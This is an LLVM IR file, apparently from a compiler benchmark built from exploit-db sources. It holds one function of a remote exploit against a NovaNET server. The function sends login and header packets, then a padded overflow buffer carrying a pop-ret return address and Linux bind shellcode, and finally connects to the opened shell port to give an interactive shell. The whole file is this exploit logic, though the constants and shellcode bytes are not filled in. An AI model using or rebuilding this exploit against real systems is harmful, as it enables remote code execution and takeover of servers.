; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_33877.c_novanet_own_process.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_33877.c_novanet_own_process.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@NOVANET_PKT_SZ = common dso_local global i32 0, align 4
@NOVANET_TCP_PORT = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"novanet_own_process: sockami failed\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [22 x i8] c"* connected to %s:%d\0A\00", align 1
@login_buf = common dso_local global i8* null, align 8
@NOVANET_DOMAIN_SZ = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [27 x i8] c"** sending login packet...\00", align 1
@.str.3 = private unnamed_addr constant [52 x i8] c"novanet_own_process: sock_send returned %d (!= %d)\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@.str.5 = private unnamed_addr constant [28 x i8] c"** reading fourth packet...\00", align 1
@.str.6 = private unnamed_addr constant [52 x i8] c"novanet_own_process: sock_recv returned %d (!= %d)\0A\00", align 1
@NOVANET_HDR_SZ = common dso_local global i32 0, align 4
@rem_buf = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [40 x i8] c"** sending remaining %d-bytes packet...\00", align 1
@.str.8 = private unnamed_addr constant [28 x i8] c"** sending hammer packet...\00", align 1
@NOVANET_POPRET = common dso_local global i32 0, align 4
@lnx_x86_bind = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [7 x i8] c"done\0A\0A\00", align 1
@USLEEP_TIME = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [47 x i8] c"* waiting for the shellcode to be executed...\0A\00", align 1
@PORT_SHELL = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [10 x i8] c"+Wh00t!\0A\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i8*, i8*)* @novanet_own_process to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @novanet_own_process(i8* %0, i8* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %11 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %5, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %6, align 8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* @NOVANET_TCP_PORT, align 4
  %17 = call i32 @sockami(i8* %15, i32 %16)
  store i32 %17, i32* %8, align 4
  %18 = load i32, i32* %8, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %25

20:                                               ; preds = %2
  %21 = load i32, i32* @stderr, align 4
  %22 = call i32 (i32, i8*, ...) @fprintf(i32 %21, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %23 = load i32, i32* @EXIT_FAILURE, align 4
  %24 = call i32 @exit(i32 %23) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i8*, i8** %3, align 8
  %27 = load i32, i32* @NOVANET_TCP_PORT, align 4
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0), i8* %26, i32 %27)
  %29 = load i8*, i8** @login_buf, align 8
  %30 = getelementptr inbounds i8, i8* %29, i64 84
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* @NOVANET_DOMAIN_SZ, align 4
  %33 = call i32 @memcpy(i8* %30, i8* %31, i32 %32)
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0))
  %35 = load i32, i32* %8, align 4
  %36 = load i8*, i8** @login_buf, align 8
  %37 = call i32 @sock_send(i32 %35, i8* %36, i32 7)
  store i32 %37, i32* %9, align 4
  %38 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %39 = icmp ne i32 %37, %38
  br i1 %39, label %40, label %47

40:                                               ; preds = %25
  %41 = load i32, i32* @stderr, align 4
  %42 = load i32, i32* %9, align 4
  %43 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %44 = call i32 (i32, i8*, ...) @fprintf(i32 %41, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.3, i64 0, i64 0), i32 %42, i32 %43)
  %45 = load i32, i32* @EXIT_FAILURE, align 4
  %46 = call i32 @exit(i32 %45) #4
  unreachable

47:                                               ; preds = %25
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0))
  %50 = load i32, i32* %8, align 4
  %51 = trunc i64 %12 to i32
  %52 = call i32 @sock_recv(i32 %50, i8* %14, i32 %51)
  store i32 %52, i32* %9, align 4
  %53 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %54 = icmp ne i32 %52, %53
  br i1 %54, label %55, label %62

55:                                               ; preds = %47
  %56 = load i32, i32* @stderr, align 4
  %57 = load i32, i32* %9, align 4
  %58 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %59 = call i32 (i32, i8*, ...) @fprintf(i32 %56, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.6, i64 0, i64 0), i32 %57, i32 %58)
  %60 = load i32, i32* @EXIT_FAILURE, align 4
  %61 = call i32 @exit(i32 %60) #4
  unreachable

62:                                               ; preds = %47
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  store i32 313, i32* %10, align 4
  %64 = load i32, i32* %10, align 4
  %65 = load i32, i32* @NOVANET_HDR_SZ, align 4
  %66 = add nsw i32 %64, %65
  %67 = load i8*, i8** @rem_buf, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 12
  %69 = bitcast i8* %68 to i32*
  store i32 %66, i32* %69, align 4
  %70 = load i32, i32* %10, align 4
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.7, i64 0, i64 0), i32 %70)
  %72 = load i32, i32* %8, align 4
  %73 = load i8*, i8** @rem_buf, align 8
  %74 = call i32 @sock_send(i32 %72, i8* %73, i32 7)
  store i32 %74, i32* %9, align 4
  %75 = load i32, i32* @NOVANET_HDR_SZ, align 4
  %76 = icmp ne i32 %74, %75
  br i1 %76, label %77, label %84

77:                                               ; preds = %62
  %78 = load i32, i32* @stderr, align 4
  %79 = load i32, i32* %9, align 4
  %80 = load i32, i32* @NOVANET_HDR_SZ, align 4
  %81 = call i32 (i32, i8*, ...) @fprintf(i32 %78, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.3, i64 0, i64 0), i32 %79, i32 %80)
  %82 = load i32, i32* @EXIT_FAILURE, align 4
  %83 = call i32 @exit(i32 %82) #4
  unreachable

84:                                               ; preds = %62
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.8, i64 0, i64 0))
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = mul i64 %88, 1
  %90 = trunc i64 %89 to i32
  %91 = call i8* @malloc(i32 %90)
  store i8* %91, i8** %7, align 8
  %92 = load i8*, i8** %7, align 8
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @memset(i8* %92, i32 65, i32 %93)
  %95 = load i32, i32* @NOVANET_POPRET, align 4
  %96 = load i8*, i8** %7, align 8
  %97 = getelementptr inbounds i8, i8* %96, i64 308
  %98 = bitcast i8* %97 to i32*
  store i32 %95, i32* %98, align 4
  %99 = load i8*, i8** %7, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 0
  %101 = load i8*, i8** @lnx_x86_bind, align 8
  %102 = call i32 @memcpy(i8* %100, i8* %101, i32 7)
  %103 = load i8*, i8** %7, align 8
  %104 = load i32, i32* %10, align 4
  %105 = sub nsw i32 %104, 1
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %103, i64 %106
  store i8 0, i8* %107, align 1
  %108 = load i32, i32* %8, align 4
  %109 = load i8*, i8** %7, align 8
  %110 = load i32, i32* %10, align 4
  %111 = call i32 @sock_send(i32 %108, i8* %109, i32 %110)
  store i32 %111, i32* %9, align 4
  %112 = load i32, i32* %10, align 4
  %113 = icmp ne i32 %111, %112
  br i1 %113, label %114, label %121

114:                                              ; preds = %84
  %115 = load i32, i32* @stderr, align 4
  %116 = load i32, i32* %9, align 4
  %117 = load i32, i32* %10, align 4
  %118 = call i32 (i32, i8*, ...) @fprintf(i32 %115, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.3, i64 0, i64 0), i32 %116, i32 %117)
  %119 = load i32, i32* @EXIT_FAILURE, align 4
  %120 = call i32 @exit(i32 %119) #4
  unreachable

121:                                              ; preds = %84
  %122 = load i8*, i8** %7, align 8
  %123 = call i32 @free(i8* %122)
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  %125 = load i32, i32* @USLEEP_TIME, align 4
  %126 = call i32 @usleep(i32 %125)
  %127 = load i32, i32* %8, align 4
  %128 = call i32 @close(i32 %127)
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.10, i64 0, i64 0))
  %130 = call i32 @sleep(i32 2)
  %131 = load i8*, i8** %3, align 8
  %132 = load i32, i32* @PORT_SHELL, align 4
  %133 = call i32 @sockami(i8* %131, i32 %132)
  store i32 %133, i32* %8, align 4
  %134 = icmp ne i32 %133, -1
  br i1 %134, label %135, label %139

135:                                              ; preds = %121
  %136 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0))
  %137 = load i32, i32* %8, align 4
  %138 = call i32 @shellami(i32 %137)
  br label %139

139:                                              ; preds = %135, %121
  %140 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %140)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @sockami(i8*, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @sock_send(i32, i8*, i32) #2

declare dso_local i32 @sock_recv(i32, i8*, i32) #2

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @free(i8*) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @shellami(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
